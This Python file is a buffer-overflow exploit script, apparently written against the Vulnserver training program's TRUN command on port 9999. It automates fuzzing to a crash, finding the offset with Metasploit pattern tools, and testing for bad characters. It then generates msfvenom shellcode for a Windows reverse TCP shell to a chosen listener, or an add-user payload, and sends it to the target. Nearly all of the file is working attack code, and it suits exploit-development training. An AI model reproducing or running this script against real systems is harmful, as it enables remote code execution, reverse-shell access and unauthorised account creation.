#!/usr/bin/python

import sys, socket, argparse, subprocess
from binascii import hexlify 
from colorama import Fore, Back, Style, init
import codecs

init(autoreset=True) # Colorama auto reset settings
IP = ('192.168.1.108').encode('latin-1')
CRASH = 3000 # Size of the total payload when EXE crashed
PORT = 9999 # Remote Port where the EXE is listening
EBP = 2003 # Total Size of the EBP
EIP = "\xaf\x11\x50\x62" # EIP Size
NOPS = 10 # Size of NOPS
cmd = "TRUN /.:/" # Name oof the Vulnerable variable

badcharlist = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

def Crash(): 

    buffer = []

    counter = 100

    while len(buffer) <= 100:
        buffer.append('A' * counter)
        counter = counter + 100

    for string in buffer:
        print(Fore.RED + "Fuzzing with %s bytes"%len(string))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))
        try:
            s.send(bytes(cmd + string,"latin-1"))
            s.recv(1024)
        except:
            print(Fore.GREEN + "Program crashed while sending %s bytes"% str(len(string)-100))
            sys.exit()
        s.close()

def sendPayload(buffer):
    try:
        print(Fore.RED + "Sending Payload ....")
        payload = cmd + buffer
        print(bytes(payload,"latin-1"))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))
        s.send(bytes(payload,"latin-1"))
        s.recv(1024)
        print(Fore.GREEN + "Payload Sent!")
        s.close()
        
    except Exception as e:
        print(e)
        print(Fore.GREEN + "Either the service crashed or it's not running")

def pattern_create(length):
    print("Creating pattern of Length " + str(length))
    pattern = subprocess.run(["msf-pattern_create -l %s"%length], shell=True, stdout=subprocess.PIPE)
    pattern = pattern.stdout.decode('latin-1').strip()
    sendPayload(pattern)

def pattern_offset(offset):
    print("Finding the offset address for " + offset)
    offset = subprocess.run(["msf-pattern_offset -q %s"%offset], shell=True, stdout=subprocess.PIPE)
    print(offset.stdout.decode('latin-1'))

def send_badchars():
    print("Sending Badchars")
    buffer = "\x41" * EBP + "\x42" * 4 + "\x90" * NOPS + badcharlist + "\x43" * ( CRASH - EBP - 4 - NOPS)
    sendPayload(str(buffer))

def remove_badchars(badchar):
    import itertools    
    new_badchar = [i for i in badcharlist]
    hex_digits = ["".join(i) for i in itertools.product("0123456789ABCDEF",repeat=2)][1:]
     
    Flag = False
    with open('badchar.txt', 'r') as f:
        b = f.read().strip()
        f.close()
        for i in b.split(','):
            if i == badchar:
                Flag = True
                
            try:
                index = hex_digits.index(str(i[-2:]).upper())
                new_badchar.remove(new_badchar[index])
                hex_digits.remove(hex_digits[index])
            except Exception as e:
                print(e)

    if not Flag:
        index = hex_digits.index(badchar[-2:].upper())    
        new_badchar.remove(new_badchar[index])
        hex_digits.remove(hex_digits[index])
    
    
    with open('badchar.txt', 'w') as f:
        if badchar not in b.split(','):
            b += badchar + ','
        f.write(b)
        f.close()
    
    buffer = "\x41" * EBP + "\x42" * 4 + "\x90" * NOPS + "".join(new_badchar) + "\x43" * ( CRASH - EBP - 4 - NOPS)

    sendPayload(buffer)

def shellcode(choice,LHOST=None,LPORT=None):
    if EIP == "":
        print("Please set the EIP Location.")
        print(Fore.RED + "Exiting...")
        sys.exit()

    print('''
    1. Windows Reverse Shell TCP
    2. Windows Reverse Shell TCP x64
    3. Windows User Add 
    4. Windows User Add x64
    ''')
    
    #choice = int(input(">> "))
    
    if choice == 1 or choice == 2:
        if LHOST == None or LPORT == None:
            LHOST = input("Enter LHOST IP Address : ")
            LPORT = input("Enter LPORT Number : ")
        print("Generating shellcode")
        with open('badchar.txt', 'r') as f:
            bd = f.read()
            bd = bd.replace(",","\\")
            bd = bd[:-1]
        if choice == 1:
            shellcode = subprocess.run(["msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} -b '{}' -f c EXITFUNC=thread --platform windows".format(LHOST,LPORT,bd) ], shell=True, stdout=subprocess.PIPE)
            shellcode = shellcode.stdout.decode('latin-1')
            shellcode = shellcode.split("\n",1)[1]
            shellcode = "".join([i[1:-1] for i in shellcode[:-2].split("\n")])
            print("Shellcode : "+str(shellcode))
            buffer = "\x41" * EBP + EIP + "\x90" * NOPS + str(shellcode) + "\x43" * ( CRASH - EBP - 4 - NOPS)
            sendPayload(buffer)
        if choice == 2:
            #print("msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} -b '{}' -f c EXITFUNC=thread --platform windows".format(LHOST,LPORT,bd))
            shellcode = subprocess.run(["msfvenom -p windows/x64/shell_reverse_tcp LHOST={} LPORT={} -b '{}' -f c EXITFUNC=thread --platform windows".format(LHOST,LPORT,bd) ], shell=True, stdout=subprocess.PIPE)
            shellcode = shellcode.stdout.decode('utf-8')
            shellcode = shellcode.split("\n",1)[1]
            shellcode = "".join([i[1:-1] for i in shellcode[:-2].split("\n")]).replace(r"\\x",r"\x")
            import codecs
            shellcode=codecs.decode(shellcode, 'unicode_escape')
            #print("Shellcode : "+shellcode)
            buffer = "\x41" * EBP + EIP + "\x90" * NOPS + shellcode + "\x43" * ( CRASH - EBP - 4 - NOPS)
            sendPayload(buffer)
    if choice == 3:
        # msfvenom -p windows/adduser -b "\x00\x04\xa4\xba\xef" -e x86/fnstenv_mov -f c
        with open('badchar.txt', 'r') as f:
            bd = f.read()
            bd = bd.replace(",","\\")
        command = "msfvenom -p windows/adduser -b '%s' -e x86/fnstenv_mov -f c" % bd[:-1]
        shellcode = subprocess.run([command], shell=True, stdout=subprocess.PIPE)
        shellcode = shellcode.stdout.decode('latin-1')
        shellcode = shellcode.split("\n",1)[1]
        shellcode = shellcode[:-2]
       
        buffer = "\x41" * EBP + "\x42" * EIP + "\x90" * NOPS + shellcode + "\x43" * ( CRASH - EBP - 4 - NOPS)
        sendPayload(buffer)

if __name__ == '__main__':

        parser = argparse.ArgumentParser()
        parser.add_argument('-c', help='Crash bytes size', action='store_true')
        parser.add_argument('-l', help='Length for sending a random pattern')
        parser.add_argument('-q', help='Query to find the offset address')
        parser.add_argument('-b', help='Send Badchars to the target', action='store_true')
        parser.add_argument('-br', help='Specify the found badcharacter')
        parser.add_argument('-s', help='Generate Shellcode')
        parser.add_argument('--L', help='Local address for reverse shell')
        parser.add_argument('--P', help='Local Port for reverse shell')
        
        args = parser.parse_args()

        if args.c :
            Crash()
        
        if args.l :
            print("Please set the Value of CRASH = %s"%args.l)
            pattern_create(args.l)

        if args.q :
            pattern_offset(args.q)

        if args.b :
            send_badchars()

        if args.br :
            remove_badchars(args.br)

        if args.s:
            shellcode(int(args.s),args.L,args.P)
            


        

        
    

